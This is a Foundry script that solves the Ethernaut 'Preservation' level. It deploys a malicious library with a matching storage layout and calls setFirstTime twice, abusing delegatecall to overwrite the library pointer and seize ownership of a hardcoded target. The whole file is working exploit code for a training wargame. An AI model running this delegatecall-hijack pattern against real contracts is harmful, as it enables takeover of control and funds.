// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import "forge-std/console2.sol";
import "../../src/Ethernaut/preservation.sol";

contract attackLibrary {
    address public timeZone1Library;
    address public timeZone2Library;
    address public owner;

    function setTime(uint256 _time) public {
        owner = tx.origin;
    }
}

contract PreservationHack {
    Preservation public target;
    attackLibrary public attackLib;

    constructor(address _target) {
        target = Preservation(_target);
        attackLib = new attackLibrary();
    }

    function attack() public {
        // Step 1: Change timeZone1Library to our malicious contract
        target.setFirstTime(uint256(uint160(address(attackLib))));

        // Step 2: Call setFirstTime again to execute our malicious setTime function
        target.setFirstTime(0); // The value doesn't matter here

        // Verify that we are now the owner
        require(target.owner() == msg.sender, "Attack failed");
    }
}

contract attackScript is Script {
    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));

        PreservationHack attacker = new PreservationHack(
            0xF77e8C41407c94E3d84C80bcB1ab4a014D626BeD
        );
        attacker.attack();
        vm.stopBroadcast();
    }
}
